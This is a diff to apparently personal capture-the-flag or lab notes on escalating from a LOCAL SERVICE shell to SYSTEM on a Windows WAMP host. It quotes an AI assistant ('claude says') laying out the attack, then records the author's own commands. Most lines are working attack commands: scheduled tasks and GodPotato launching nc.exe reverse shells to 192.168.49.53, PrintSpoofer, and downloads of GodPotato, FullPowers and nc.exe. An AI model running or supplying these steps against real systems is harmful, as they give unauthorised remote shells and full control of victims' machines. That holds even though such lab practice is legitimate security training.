@@ -170,4 +170,63 @@ now, how do we pivot to root?
 - Use PrintSpoofer to exploit SeImpersonatePrivilege and achieve SYSTEM-level access.
 ```
 
-okay.
+okay. claude says:
+
+```
+● You've got a shell as nt authority\local service and need to escalate to SYSTEM. The path is:
+
+  1. Recover LOCAL SERVICE privileges via scheduled task — LOCAL SERVICE often runs with stripped privileges. You need
+  to restore the default token (including SeImpersonatePrivilege) by running a scheduled task that spawns a new process
+  under the same account.
+
+  2. Create a scheduled task with the NT AUTHORITY\LOCAL SERVICE principal:
+  schtasks /create /tn "privesc" /tr "C:\wamp\www\shell.php" /sc onstart /ru "NT AUTHORITY\LOCAL SERVICE"
+  3. Better approach — upload nc.exe or another reverse shell binary, then:
+  schtasks /create /tn "privesc" /tr "C:\wamp\www\nc.exe -e cmd.exe 192.168.49.53 5555" /sc onstart /ru "NT
+  AUTHORITY\LOCAL SERVICE"
+  schtasks /run /tn "privesc"
+  4. Catch the new shell — it should have the full LOCAL SERVICE token with SeImpersonatePrivilege.
+  5. Verify SeImpersonatePrivilege is now present:
+  whoami /priv
+  6. Use PrintSpoofer for SYSTEM:
+    - Upload PrintSpoofer64.exe (from https://github.com/itm4n/PrintSpoofer/releases)
+    - Run:
+  PrintSpoofer64.exe -i -c cmd.exe
+  Or for a reverse shell:
+  PrintSpoofer64.exe -c "nc.exe 192.168.49.53 6666 -e cmd.exe"
+
+  Key things to upload to C:\wamp\www\ via your uploader.php:
+  - nc.exe (for the privilege-restored shell)
+  - PrintSpoofer64.exe
+
+  What's your current status — do you still have the local service shell active, or did it die?
+```
+
+```bash
+# on victim, to find .net version
+reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s
+
+# on attacker, then upload through uploader.php
+wget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe
+cp GodPotato-NET4.exe GodPotato.exe
+file GodPotato.exe
+
+wget https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
+file FullPowers.exe
+
+wget https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe
+file nc.exe
+
+# upload all 3 files.
+
+# start new listener on attacker
+nc -nvlp 6666
+
+# as victim
+copy C:\wamp\www\nc.exe C:\Windows\Temp\nc.exe
+GodPotato.exe -cmd "C:\Windows\Temp\nc.exe 192.168.49.53 6666 -e cmd.exe"
+whoami
+
+```
+
+pwned. writeup time...
